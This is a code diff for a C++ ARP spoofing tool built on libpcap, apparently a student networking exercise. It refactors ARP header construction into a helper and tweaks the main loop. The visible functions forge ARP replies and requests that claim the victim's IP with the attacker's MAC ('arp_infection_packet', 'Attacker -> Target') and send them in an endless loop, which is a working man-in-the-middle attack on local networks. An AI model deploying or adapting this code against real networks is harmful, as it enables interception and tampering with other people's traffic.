@@ -80,6 +80,17 @@ using namespace std;
 
  }
 
+ int arp_packet(int op) {
+
+     eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
+     eth_arp_hdr->ar_hrd = htons(0x0001);
+     eth_arp_hdr->ar_pro = htons(0x0800);
+     eth_arp_hdr->ar_hln = 0x06;
+     eth_arp_hdr->ar_pln = 0x04;
+     eth_arp_hdr->ar_op = htons(op);
+
+ }
+
  int arp_infection_packet(char arga[], char argb[], char argc[], char argd[], pcap_t *pcd) {
 
      change_mac(argd, eth_arp_hdr->h_dest); // Ethernet Destination
@@ -88,12 +99,7 @@ using namespace std;
      }
 
      // ARP
-     eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
-     eth_arp_hdr->ar_hrd = htons(0x0001);
-     eth_arp_hdr->ar_pro = htons(0x0800);
-     eth_arp_hdr->ar_hln = 0x06;
-     eth_arp_hdr->ar_pln = 0x04;
-     eth_arp_hdr->ar_op = htons(0x0002);
+     arp_packet(0x0002);
 
      put_ip(argb, eth_arp_hdr->__ar_sip); // Sender ip
      get_my_mac(arga, eth_arp_hdr->__ar_sha); // Sender mac
@@ -113,12 +119,7 @@ using namespace std;
      memset(eth_arp_hdr->h_dest, 0xff, 6);// Request Ethernet Destination
      get_my_mac(arga, eth_arp_hdr->h_source); // Request Ethernet Source
 
-     eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
-     eth_arp_hdr->ar_hrd = htons(0x0001);
-     eth_arp_hdr->ar_pro = htons(0x0800);
-     eth_arp_hdr->ar_hln = 0x06;
-     eth_arp_hdr->ar_pln = 0x04;
-     eth_arp_hdr->ar_op = htons(0x0001);
+     arp_packet(0x0001);
 
      put_ip(argc, eth_arp_hdr->__ar_sip); // Sender ip = Victim ip
      get_my_mac(arga, eth_arp_hdr->__ar_sha); // Sender mac = My mac
@@ -137,13 +138,9 @@ using namespace std;
 
      // Attacker -> Target
      memcpy(eth_arp_hdr->h_dest, packet, sizeof(eth_arp_hdr->h_dest)); // Destination = gateway mac address
-     get_my_mac(arga, eth_arp_hdr->h_source); // source = My mac address
+     change_mac(argd, eth_arp_hdr->h_source); // source = My mac address
 
-     eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
-     eth_arp_hdr->ar_op = htons(0x0001);
-     eth_arp_hdr->ar_pro = htons(0x0800);
-     eth_arp_hdr->ar_hln = 0x06;
-     eth_arp_hdr->ar_pln = 0x04;
+     arp_packet(0x0001);
 
      put_ip(argc, eth_arp_hdr->__ar_sip); // Sender ip = Victim ip
      change_mac(argd, eth_arp_hdr->__ar_sha); // Sender mac = My mac
@@ -184,7 +181,7 @@ int main(int argc, char *argv[])
     int res;
 
     while(1) {
-        
+
         arp_infection_packet(argv[1], argv[2], argv[3], argv[4], pcd);
         arp_request(argv[1], argv[2], argv[3], argv[4], pcd);
 
@@ -208,7 +205,7 @@ int main(int argc, char *argv[])
                 break;
             }
         }
-    sleep(2);
+    sleep(3);
     }
 }
 
@@ -228,4 +225,5 @@ int main(int argc, char *argv[])
     printf("%s", rx);
 
  */
+
 
